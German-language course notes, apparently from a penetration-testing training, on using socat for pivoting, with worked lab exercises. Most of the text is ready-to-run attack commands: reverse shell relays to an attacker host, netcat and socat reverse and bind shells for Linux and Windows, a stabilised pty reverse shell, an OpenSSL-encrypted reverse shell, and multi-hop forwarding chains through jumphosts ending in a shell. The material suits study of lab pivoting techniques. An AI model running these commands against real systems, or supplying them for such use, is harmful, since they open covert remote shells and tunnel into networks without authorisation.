- [Socat](#socat)
  - [Auf Windows](#auf-windows)
  - [Verwendung](#verwendung)
    - [Forwarding](#forwarding)
      - [RevShell Relay](#revshell-relay)
      - [Port Forwarding - Easy](#port-forwarding---easy)
      - [Port Forwarding - Quiet](#port-forwarding---quiet)
    - [Shells](#shells)
      - [Reverse Shells](#reverse-shells)
      - [Bind Shells](#bind-shells)
      - [Linux Fully Stable Shell](#linux-fully-stable-shell)
      - [Encrypted Shell](#encrypted-shell)
  - [Aufgabe 1](#aufgabe-1)
  - [Aufgabe 2](#aufgabe-2)
  - [Aufgabe 3 (optional)](#aufgabe-3-optional)

---

# Socat

= Tool zur bidirektionalen Weiterleitung

- kann Pipe Sockets zwischen zwei unabhängigen Kommunikationspartnern herstellen ohne auf SSH angewiesen zu sein
- nicht auf Netzwerkkommunikation beschränkt - eher Brückenkopf um zwei Endpunkte miteinander zu verbinden
- folgende Endpunkte sind möglich:
    - Dateien
    - Pipes
    - Devices
    - Sockets
    - SSL sockets
    - Proxy CONNECT Connections
    - File Descriptors
    - Readline
    - Programs
-nicht nur gut für fully stable Linux Shells, auch für Port Forwarding geeignet

## Auf Windows

- birgt Herausforderungen
- Cygwin
    - Socat wird nicht nativ auf Windows funktionieren
    - Installiertes Cygwin oder benötigte Abwesenheiten müssen vorhanden sein
- Firewall
    - Genutzte TCP-Ports müssen in Firewall geöffnet sein
    - Socat an sich muss nicht explizit erlaubt sein
        - Hier auf die automatischen "Block-Regeln" achten
- Funktionalität
    - TCP-Listener werden automatisch für IPv6 erstellt
    - Anpassen des Interfaces mit "bind=IP"

## Verwendung

### Forwarding

#### RevShell Relay

```code
# Angreifer
# Empfänger für Reverse Shell (nc, metasploit, usw)

sudo nc -lvnp 443

# Victim
# Weiterleitung von Local 8000 auf Attacker 443

./socat tcp-l:8000 tcp:ATTACKER_IP:443 &

# Start der Reverse Shell (nc, meterpreter, usw)

./nc 127.0.0.1 8000 -e /bin/bash
```

1. Listening Port
2. TCP-Verbindung
3. RevShell starten

#### Port Forwarding - Easy

```code
# Victim
# fork -> Jede connection in neuem Prozess
# reuseaddr -> mehrere connections auf dem Port möglich

./socat tcp-l:PORT,fork,reuseaddr tcp:TARGET_IP:TARGET_PORT &
```

#### Port Forwarding - Quiet

```code
# 1) Auf Attacker
./socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &

# 2) Auf Relay
./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &

# 3) Auf Attacker
# z.B ssh Verbindungsaufbau wenn nach Port 22 weitergeleitet wird
ssh user@127.0.0.1 -p 8000
```

### Shells

#### Reverse Shells

```code
# Reverse Shell mit Socat
# Listener mit Socat - Instabile Shell aber bei Windows und Linux möglich
socat TCP-L:<port> -

# Rückverbindung

# Windows (pipes -> Interface zwischen Unix und Windows CLIs)
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes

# Linux
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
```

#### Bind Shells

```code
# Bind Shell

# Windows
socat TCP-L:<PORT> EXEC:powershell.exe,pipes

# Linux
socat TCP-L:<PORT> EXEC:"bash -li"

# Verbindung aufbauen mit
socat TCP:<TARGET-IP>:<TARGET-PORT> - 
```

#### Linux Fully Stable Shell

```code
# Fully Stable Shell auf Linux Systemen

# Listener auf Attacker
# tty -> quasi wie stty raw -echo;fg

socat TCP-L:<PORT> FILE:'tty',raw,echo=0 

# Reverse Shell 
# -pty -> pseudoterminal allozieren (Teil der Stabilisierung)
# -stderr -> alle Fehler in der Shell anzeigen
# -sigint -> leitet Ctrl+C in den Subprozess weiter (dann klappts)
# -setsid -> Prozess in neuer Session erstellen
# -sane -> Stabilisieren der Shell um sie zu "normalisieren"

socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

#### Encrypted Shell

```code
# Zunächst erstellen eines Certs
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt

# Pem File erstellen
cat shell.key shell.crt > shell.pem

# Listener starten
# verify=0 -> PEM nicht offiziell verifizieren 
# PEM muss nicht kopiert werden
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -

# Connect Back
socat OPENSSL:<ATTACKER-IP>:<ATTACKER-PORT>,verify=0 EXEC:/bin/bash

# Ähnlich mit Bind Shell
# Target
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes

# Attacker
socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 - 
```

-----------

## Aufgabe 1

**Versucht euch an der vorgestellten Technik für Reverse Shell Relays mit Socat. Als Reverse Shell könnt ihr wieder Msfvenom oder netcat verwenden.**

_Gemäß oben aufgeführter Beschreibung_

Für eine Fully Stabilized Linux Shell:

```code
# Attacker
# Backticks statt Hochkommata

socat TCP-L:8888 FILE:`tty`,raw,echo=0

# Victim
# Vorher socat transferieren, falls noch nicht auf der Maschine
# Richtige Shell-Umgebung wählen

./socat TCP:192.168.1.2:8888 EXEC:"/bin/bash",pty,stderr,sigint,setsid,sane
```

## Aufgabe 2

**Euch wurden verschiedene Möglichkeiten der Portweiterleitung vorgestellt - probiert Sie aus! Der Webserver wartet schon.**

```bash
# Jumphost 2

./socat -d -d tcp-l:8004,fork tcp:10.10.1.253:80

# Jumphost 1

./socat -d -d tcp-l:8001,fork,reusaddr tcp:10.1.5.251:8004

# Attacker

./socat -d -d tcp-l:8000,fork,reuseaddr tcp:192.168.1.1:8001
```

In der Reihenfolge lässt sich auf der Attacker-Maschine die 8000 ancurlen und man erhält eine Verbindung zur öffentlichen Website. <br>
_Die Reihenfolge der Endpoints in Socat ist von Bedeutung!_

## Aufgabe 3 (optional)

**Auch wenn es nicht direkt mit Pivoting zu tun hat - die Fähigkeiten von Socat zur Verwendung als Reverse Shell sind sehr gut. Erzeugt euch eine Reverse Shell, welche über Portweiterleitungen vom Webserver bis zu eurem Attacker läuft - nur mit Socat.**

```bash
# Attacker

socat -d -d TCP-LISTEN:444,reuseaddr,fork,bind=192.168.1.2 -

# Jumphost 1

./socat -d -d TCP-LISTEN:5555,reuseaddr,fork,bind=10.1.5.252 TCP:192.168.1.2:4444

# Jumphost 2

./socat -d -d TCP-LISTEN:6666,reuseaddr,fork,bind=10.10.1.254 TCP:10.1.5.252:5555

# Target

./socat TCP:10.10.1.254:6666 EXEC:"/bin/bash",pty,stderr,sigint,setsid,sane
```

In der Reihenfolge ausgeführt erhält man auf der Attacker-Maschine eine stabilized RevShell.